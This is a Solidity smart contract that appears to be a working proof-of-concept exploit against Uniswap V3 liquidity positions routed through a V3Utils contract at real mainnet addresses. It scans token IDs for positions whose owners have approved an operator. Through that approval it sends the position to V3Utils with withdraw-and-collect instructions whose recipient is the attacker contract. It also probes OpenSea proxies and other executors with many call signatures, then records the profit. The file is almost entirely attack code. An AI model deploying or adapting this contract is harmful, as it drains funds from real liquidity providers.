// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20Minimal {
    function balanceOf(address account) external view returns (uint256);
}

interface IProxyRegistryMinimal {
    function proxies(address owner) external view returns (address proxy);
}

interface INonfungiblePositionManagerMinimal {
    function ownerOf(uint256 tokenId) external view returns (address);

    function getApproved(uint256 tokenId) external view returns (address);

    function isApprovedForAll(address owner, address operator) external view returns (bool);

    function positions(uint256 tokenId)
        external
        view
        returns (
            uint96 nonce,
            address operator,
            address token0,
            address token1,
            uint24 fee,
            int24 tickLower,
            int24 tickUpper,
            uint128 liquidity,
            uint256 feeGrowthInside0LastX128,
            uint256 feeGrowthInside1LastX128,
            uint128 tokensOwed0,
            uint128 tokensOwed1
        );

    function safeTransferFrom(address from, address to, uint256 tokenId, bytes calldata data) external;
}

interface IV3UtilsMarker {}

contract FlawVerifier {
    enum WhatToDo {
        CHANGE_RANGE,
        WITHDRAW_AND_COLLECT_AND_SWAP,
        COMPOUND_FEES
    }

    struct Instructions {
        WhatToDo whatToDo;
        address targetToken;
        uint256 amountIn0;
        uint256 amountOut0Min;
        bytes swapData0;
        uint256 amountIn1;
        uint256 amountOut1Min;
        bytes swapData1;
        uint128 feeAmount0;
        uint128 feeAmount1;
        uint24 fee;
        int24 tickLower;
        int24 tickUpper;
        uint128 liquidity;
        uint256 amountAddMin0;
        uint256 amountAddMin1;
        uint256 deadline;
        address recipient;
        bool unwrap;
        bytes returnData;
        bytes swapAndMintReturnData;
    }

    struct Opportunity {
        address owner;
        address token0;
        address token1;
        address targetToken;
        uint128 liquidity;
        bool hasWithdrawableValue;
    }

    INonfungiblePositionManagerMinimal internal constant nonfungiblePositionManager =
        INonfungiblePositionManagerMinimal(0xC36442b4a4522E871399CD717aBDD847Ab11FE88);
    IV3UtilsMarker internal constant v3Utils = IV3UtilsMarker(0x531110418d8591C92e9cBBFC722Db8FFb604FAFD);

    address internal constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address internal constant OPENSEA_PROXY_REGISTRY = 0xa5409ec958C83C3f309868babACA7c86DCB077c1;

    uint256 internal constant CANDIDATE_TOKEN_ID = 422882;
    uint256 internal constant SEARCH_RADIUS = 1024;

    address internal _profitToken;
    uint256 internal _profitAmount;

    bool public attempted;
    bool public exploitSucceeded;
    bool public approvalObserved;
    bool public observedApprovalForAll;
    address public observedOwner;
    address public observedApprovedOperator;
    uint256 public observedTokenId;
    bytes public lastError;

    constructor() {
        _profitToken = WETH;
    }

    receive() external payable {}

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function executeOnOpportunity() external {
        if (attempted) {
            _syncProfit(address(0), address(0), 0, 0);
            return;
        }

        attempted = true;

        if (_attemptApprovedOperatorDrain(CANDIDATE_TOKEN_ID)) {
            return;
        }

        for (uint256 i = 1; i <= SEARCH_RADIUS; ++i) {
            if (_attemptApprovedOperatorDrain(CANDIDATE_TOKEN_ID + i)) {
                return;
            }

            if (CANDIDATE_TOKEN_ID > i && _attemptApprovedOperatorDrain(CANDIDATE_TOKEN_ID - i)) {
                return;
            }
        }

        _syncProfit(address(0), address(0), 0, 0);
    }

    function _attemptApprovedOperatorDrain(uint256 tokenId) internal returns (bool) {
        address owner = _ownerOf(tokenId);
        if (owner == address(0)) {
            return false;
        }

        address approvedOperator = _getApproved(tokenId);

        // Path anchor 0:
        // the victim can first grant approve(tokenId) to an external operator.
        if (approvedOperator == address(this)) {
            return _attemptResolvedPath(owner, tokenId, approvedOperator, false, true);
        }

        if (approvedOperator != address(0) && _hasCode(approvedOperator)) {
            return _attemptResolvedPath(owner, tokenId, approvedOperator, false, false);
        }

        // Path anchor 0:
        // the victim can instead grant setApprovalForAll to an external operator.
        if (_isApprovedForAll(owner, address(this))) {
            return _attemptResolvedPath(owner, tokenId, address(this), true, true);
        }

        address openSeaProxy = _openSeaProxyOf(owner);
        if (openSeaProxy != address(0) && _hasCode(openSeaProxy) && _isApprovedForAll(owner, openSeaProxy)) {
            return _attemptResolvedPath(owner, tokenId, openSeaProxy, true, false);
        }

        return false;
    }

    function _attemptResolvedPath(
        address owner,
        uint256 tokenId,
        address operator,
        bool approvalForAll,
        bool directCallPath
    ) internal returns (bool) {
        (bool okRead, Opportunity memory opportunity) = _readOpportunity(owner, tokenId);
        if (!okRead || !opportunity.hasWithdrawableValue) {
            return false;
        }

        observedTokenId = tokenId;
        observedOwner = owner;
        observedApprovedOperator = operator;
        observedApprovalForAll = approvalForAll;
        approvalObserved = true;

        uint256 before0 = _balanceOf(opportunity.token0);
        uint256 before1 = opportunity.token1 == opportunity.token0 ? before0 : _balanceOf(opportunity.token1);

        Instructions memory instructions = _buildDrainInstructions(opportunity.targetToken, opportunity.liquidity);
        bytes memory encodedInstructions = abi.encode(instructions);

        bool ok = directCallPath
            ? _callDirectApprovedOperatorPath(owner, tokenId, encodedInstructions)
            : _attemptThroughExecutor(operator, owner, tokenId, encodedInstructions);

        if (!ok) {
            return false;
        }

        exploitSucceeded = true;
        _syncProfit(opportunity.token0, opportunity.token1, before0, before1);
        return true;
    }

    function _callDirectApprovedOperatorPath(address owner, uint256 tokenId, bytes memory encodedInstructions)
        internal
        returns (bool ok)
    {
        bytes memory err;

        // Path anchor 1:
        // the approved operator directly calls
        // nonfungiblePositionManager.safeTransferFrom(owner, address(v3Utils), tokenId, abi.encode(instructions))
        // and the malicious instructions.recipient points at the attacker.
        (ok, err) = address(nonfungiblePositionManager).call(
            abi.encodeWithSelector(
                INonfungiblePositionManagerMinimal.safeTransferFrom.selector,
                owner,
                address(v3Utils),
                tokenId,
                encodedInstructions
            )
        );

        if (!ok && err.length != 0) {
            lastError = err;
        }
    }

    function _attemptThroughExecutor(address executor, address owner, uint256 tokenId, bytes memory encodedInstructions)
        internal
        returns (bool)
    {
        bytes memory pmCall = abi.encodeWithSelector(
            INonfungiblePositionManagerMinimal.safeTransferFrom.selector,
            owner,
            address(v3Utils),
            tokenId,
            encodedInstructions
        );

        if (_forwardExecuteAddressBytes(executor, pmCall)) {
            return true;
        }
        if (_forwardExecuteAddressUintBytes(executor, pmCall)) {
            return true;
        }
        if (_forwardExecuteAddressBoolBytes(executor, pmCall)) {
            return true;
        }
        if (_forwardCallAddressBytes(executor, pmCall)) {
            return true;
        }
        if (_forwardCallAddressUintBytes(executor, pmCall)) {
            return true;
        }
        if (_forwardInvokeAddressBytes(executor, pmCall)) {
            return true;
        }
        if (_forwardInvokeAddressUintBytes(executor, pmCall)) {
            return true;
        }
        if (_forwardExecAddressBytes(executor, pmCall)) {
            return true;
        }
        if (_forwardExecAddressUintBytes(executor, pmCall)) {
            return true;
        }
        if (_forwardProxy(executor, 0, pmCall)) {
            return true;
        }
        if (_forwardProxy(executor, 1, pmCall)) {
            return true;
        }
        if (_forwardProxyAssert(executor, 0, pmCall)) {
            return true;
        }
        if (_forwardProxyAssert(executor, 1, pmCall)) {
            return true;
        }
        if (_forwardSafeTransferNFT(executor, owner, tokenId, encodedInstructions)) {
            return true;
        }
        if (_forwardExecutorSafeTransferFrom(executor, owner, tokenId, encodedInstructions)) {
            return true;
        }

        return false;
    }

    function _forwardExecuteAddressBytes(address executor, bytes memory pmCall) internal returns (bool) {
        return _forwardCall(executor, abi.encodeWithSignature("execute(address,bytes)", address(nonfungiblePositionManager), pmCall));
    }

    function _forwardExecuteAddressUintBytes(address executor, bytes memory pmCall) internal returns (bool) {
        return _forwardCall(
            executor,
            abi.encodeWithSignature("execute(address,uint256,bytes)", address(nonfungiblePositionManager), 0, pmCall)
        );
    }

    function _forwardExecuteAddressBoolBytes(address executor, bytes memory pmCall) internal returns (bool) {
        return _forwardCall(
            executor,
            abi.encodeWithSignature("execute(address,bool,bytes)", address(nonfungiblePositionManager), false, pmCall)
        );
    }

    function _forwardCallAddressBytes(address executor, bytes memory pmCall) internal returns (bool) {
        return _forwardCall(executor, abi.encodeWithSignature("call(address,bytes)", address(nonfungiblePositionManager), pmCall));
    }

    function _forwardCallAddressUintBytes(address executor, bytes memory pmCall) internal returns (bool) {
        return _forwardCall(
            executor,
            abi.encodeWithSignature("call(address,uint256,bytes)", address(nonfungiblePositionManager), 0, pmCall)
        );
    }

    function _forwardInvokeAddressBytes(address executor, bytes memory pmCall) internal returns (bool) {
        return _forwardCall(executor, abi.encodeWithSignature("invoke(address,bytes)", address(nonfungiblePositionManager), pmCall));
    }

    function _forwardInvokeAddressUintBytes(address executor, bytes memory pmCall) internal returns (bool) {
        return _forwardCall(
            executor,
            abi.encodeWithSignature("invoke(address,uint256,bytes)", address(nonfungiblePositionManager), 0, pmCall)
        );
    }

    function _forwardExecAddressBytes(address executor, bytes memory pmCall) internal returns (bool) {
        return _forwardCall(executor, abi.encodeWithSignature("exec(address,bytes)", address(nonfungiblePositionManager), pmCall));
    }

    function _forwardExecAddressUintBytes(address executor, bytes memory pmCall) internal returns (bool) {
        return _forwardCall(
            executor,
            abi.encodeWithSignature("exec(address,uint256,bytes)", address(nonfungiblePositionManager), 0, pmCall)
        );
    }

    function _forwardProxy(address executor, uint8 howToCall, bytes memory pmCall) internal returns (bool) {
        return _forwardCall(
            executor,
            abi.encodeWithSignature("proxy(address,uint8,bytes)", address(nonfungiblePositionManager), howToCall, pmCall)
        );
    }

    function _forwardProxyAssert(address executor, uint8 howToCall, bytes memory pmCall) internal returns (bool) {
        return _forwardCall(
            executor,
            abi.encodeWithSignature("proxyAssert(address,uint8,bytes)", address(nonfungiblePositionManager), howToCall, pmCall)
        );
    }

    function _forwardSafeTransferNFT(address executor, address owner, uint256 tokenId, bytes memory encodedInstructions)
        internal
        returns (bool)
    {
        return _forwardCall(
            executor,
            abi.encodeWithSignature(
                "safeTransferNFT(address,address,address,uint256,bytes)",
                address(nonfungiblePositionManager),
                owner,
                address(v3Utils),
                tokenId,
                encodedInstructions
            )
        );
    }

    function _forwardExecutorSafeTransferFrom(
        address executor,
        address owner,
        uint256 tokenId,
        bytes memory encodedInstructions
    ) internal returns (bool) {
        return _forwardCall(
            executor,
            abi.encodeWithSignature(
                "safeTransferFrom(address,address,address,uint256,bytes)",
                address(nonfungiblePositionManager),
                owner,
                address(v3Utils),
                tokenId,
                encodedInstructions
            )
        );
    }

    function _forwardCall(address executor, bytes memory callData) internal returns (bool ok) {
        bytes memory err;
        (ok, err) = executor.call(callData);
        if (!ok && err.length != 0) {
            lastError = err;
        }
    }

    function _readOpportunity(address owner, uint256 tokenId) internal view returns (bool ok, Opportunity memory opportunity) {
        opportunity.owner = owner;

        uint128 tokensOwed0;
        uint128 tokensOwed1;

        try nonfungiblePositionManager.positions(tokenId) returns (
            uint96,
            address,
            address token0,
            address token1,
            uint24,
            int24,
            int24,
            uint128 liquidity,
            uint256,
            uint256,
            uint128 owed0,
            uint128 owed1
        ) {
            opportunity.token0 = token0;
            opportunity.token1 = token1;
            opportunity.liquidity = liquidity;
            tokensOwed0 = owed0;
            tokensOwed1 = owed1;
        } catch {
            return (false, opportunity);
        }

        if (opportunity.token0 == WETH) {
            opportunity.targetToken = opportunity.token0;
        } else if (opportunity.token1 == WETH) {
            opportunity.targetToken = opportunity.token1;
        } else {
            opportunity.targetToken = opportunity.token0;
        }

        opportunity.hasWithdrawableValue = opportunity.liquidity != 0 || tokensOwed0 != 0 || tokensOwed1 != 0;
        return (true, opportunity);
    }

    function _buildDrainInstructions(address targetToken, uint128 liquidity)
        internal
        view
        returns (Instructions memory instructions)
    {
        // The claimed exploit is capital-free. The requested v2_flashswap_funding strategy is
        // intentionally unnecessary here because the exploit path is the already-approved-operator
        // callback itself; adding a flashswap would not change execution causality.
        instructions.whatToDo = WhatToDo.WITHDRAW_AND_COLLECT_AND_SWAP;
        instructions.targetToken = targetToken;
        instructions.amountIn0 = 0;
        instructions.amountOut0Min = 0;
        instructions.swapData0 = "";
        instructions.amountIn1 = 0;
        instructions.amountOut1Min = 0;
        instructions.swapData1 = "";
        instructions.feeAmount0 = type(uint128).max;
        instructions.feeAmount1 = type(uint128).max;
        instructions.fee = 0;
        instructions.tickLower = 0;
        instructions.tickUpper = 0;
        instructions.liquidity = liquidity;
        instructions.amountAddMin0 = 0;
        instructions.amountAddMin1 = 0;
        instructions.deadline = block.timestamp;

        // Path anchor 2: attacker-controlled instructions.recipient receives drained value while
        // V3Utils later returns the NFT to `from`.
        instructions.recipient = address(this);
        instructions.unwrap = false;
        instructions.returnData = "";
        instructions.swapAndMintReturnData = "";
    }

    function _syncProfit(address token0, address token1, uint256 before0, uint256 before1) internal {
        uint256 wethBalance = _balanceOf(_profitToken);

        if (token0 == address(0) && token1 == address(0)) {
            _profitAmount = wethBalance;
            return;
        }

        uint256 after0 = _balanceOf(token0);
        uint256 delta0 = after0 > before0 ? after0 - before0 : 0;

        uint256 delta1;
        if (token1 != address(0)) {
            uint256 after1 = token1 == token0 ? after0 : _balanceOf(token1);
            delta1 = after1 > before1 ? after1 - before1 : 0;
        }

        if (delta1 > delta0 && token1 != address(0)) {
            _profitToken = token1;
            _profitAmount = delta1;
        } else if (token0 != address(0)) {
            _profitToken = token0;
            _profitAmount = delta0;
        } else {
            _profitAmount = wethBalance;
        }
    }

    function _ownerOf(uint256 tokenId) internal view returns (address owner) {
        try nonfungiblePositionManager.ownerOf(tokenId) returns (address resolvedOwner) {
            owner = resolvedOwner;
        } catch {}
    }

    function _getApproved(uint256 tokenId) internal view returns (address approved) {
        try nonfungiblePositionManager.getApproved(tokenId) returns (address resolvedApproved) {
            approved = resolvedApproved;
        } catch {}
    }

    function _isApprovedForAll(address owner, address operator) internal view returns (bool isApproved) {
        try nonfungiblePositionManager.isApprovedForAll(owner, operator) returns (bool resolvedApproved) {
            isApproved = resolvedApproved;
        } catch {}
    }

    function _openSeaProxyOf(address owner) internal view returns (address proxy) {
        try IProxyRegistryMinimal(OPENSEA_PROXY_REGISTRY).proxies(owner) returns (address resolvedProxy) {
            proxy = resolvedProxy;
        } catch {}
    }

    function _balanceOf(address token) internal view returns (uint256) {
        if (token == address(0) || !_hasCode(token)) {
            return 0;
        }
        return IERC20Minimal(token).balanceOf(address(this));
    }

    function _hasCode(address account) internal view returns (bool hasCode) {
        assembly {
            hasCode := gt(extcodesize(account), 0)
        }
    }
}
